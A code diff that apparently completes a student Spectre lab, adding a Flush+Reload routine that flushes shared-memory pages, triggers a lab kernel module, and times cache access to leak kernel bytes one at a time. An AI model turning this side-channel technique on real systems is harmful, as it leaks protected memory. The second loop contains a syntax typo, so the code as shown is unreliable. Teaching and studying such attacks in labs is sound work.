@@ -50,6 +50,22 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+        for (int i = 0; i < 256; i++) {
+            clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+        }
+
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+        uint64_t shortest_access = (uint64_t) -1;
+        int best_i = -1;
+        for (int i = 0l i < 256; i++) {
+            uint64_t access_time = time_access(&shared_memory[i*SHD_SPECTRE_LAB_PAGE_SIZE]);
+            if (access_time < shortest_access) {
+                shortest_access = access_time;
+                best_i = i;
+            }
+        }
+        leaked_byte = (char) best_i;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
